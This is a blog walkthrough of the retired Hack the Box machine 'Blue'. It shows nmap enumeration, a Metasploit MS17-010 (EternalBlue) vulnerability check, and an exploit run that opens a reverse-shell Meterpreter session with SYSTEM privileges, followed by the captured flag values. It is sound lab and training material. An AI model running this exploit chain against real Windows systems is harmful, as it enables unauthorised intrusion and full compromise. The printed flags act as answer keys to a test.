---
title: Blue, Hack the Box CTF Walkthrough
description: 
tag: CTF
image: /assets/img/posts/2021-03-04-blue-hack-the-box-walkthrough/blue.png
layout: post
description: ""
date:   2021-03-03 20:01:21 -0400
last-updated: 2021-03-03 20:01:21 -0400
tag: ctf
author: Tyler Butler
lead: Blue is an easy level machine in the Hack the Box retired archives requiring simple enumeration and basic level understanding of metasploit
card: card-2
---

Blue is an easy level machine in the Hack the Box retired archives. This machine requires a simple enumeration scan to identify services and versions, and knowledge of using pre-configured metasploit modules to exploit a well-known vulnerability. The title of this box should be a major clue to what vulnerabilities might exist. 

## Enumeration  

First, I used nmap and the nmapAutomator script to search the target for open ports, running services, and their corresponding service versions. 

```bash
┌──(kali㉿kali)-[~/Documents/htb/blue]
└─$ nmapAutomator.sh 10.10.10.226 All
```  

```bash
┌──(kali㉿kali)-[~/Documents/htb/blue]
└─$ sudo nmap -sV -A -O --top-ports 200 10.10.10.40                                                                                                    1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 15:24 EST
Nmap scan report for 10.10.10.40
Host is up (0.055s latency).
Not shown: 191 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```

The resulting output shows the target was running windows microsoft-ds,netbios, and msrpc. I had a feeling this machine was vulnerable to eternal blue due to the box title. To check my assumption, I opened up metasploit and used a `check` option in one of the ms17_010 related modules. After setting the RHOST to the target, the check revealed it was likely vulnerable. 

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_psexec) > 
```

## Selecting a Public Exploit  

There are a few metasploit modules which can be used to root a machine vulnerable to eternal blue, i decided to use the `windows/smb/ms17_010_psexec` module. After opening the msfconsole, and selecting the psexec module, I configured the options to use the target as the RHOST and my machine as the LHOST. Running the exploit was successful.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.40:49161) at 2021-03-04 15:11:16 -0500

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

## Finding Flags  

I stayed in the meterpreter shell to navigate the target and search for flags. Using the search meterpreter command, I found both the user and root flag files.

```bash
meterpreter > search -f *user.txt*
Found 3 results...
    c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\user.txt.lnk (909 bytes)
    c:\Users\haris\AppData\Roaming\Microsoft\Windows\Recent\user.txt.lnk (556 bytes)
    c:\Users\haris\Desktop\user.txt (32 bytes)
meterpreter > type "c:\Users\haris\Desktop\user.txt"
[-] Unknown command: type.
meterpreter > cat "c:\Users\haris\Desktop\user.txt"
4c546aea7dbee75cbd71de245c8deea9meterpreter > 
```  

```bash
meterpreter > search -f "root.txt"
Found 1 result...
    c:\Users\Administrator\Desktop\root.txt (32 bytes)
meterpreter > cat "c:\Users\Administrator\Desktop\root.txt"
ff548eb71e920ff6c08843ce9df4e717meterpreter > 
```
